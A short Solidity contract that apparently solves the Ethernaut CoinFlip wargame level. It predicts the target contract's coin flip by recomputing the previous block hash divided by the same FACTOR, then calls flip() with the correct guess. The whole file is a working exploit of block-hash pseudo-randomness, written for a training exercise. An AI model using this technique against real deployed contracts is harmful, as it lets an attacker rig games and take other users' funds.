// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.7;

interface CoinFlipInterface {
  function flip(bool _guess) external returns (bool);
}

contract CoinFlip {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // the address of the contract instance
    // for the current level.
    address public victimAddress;

    event Received();

    constructor(address victim) {
        victimAddress = victim;
    }

    function guess() public {
        // We replicate the blockValue information from our contract
        // and guess the same side of the coin.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool myGuess = coinFlip == 1 ? true : false;
        CoinFlipInterface(victimAddress).flip(myGuess);
    }

    receive() external payable {
        emit Received();
    }
}
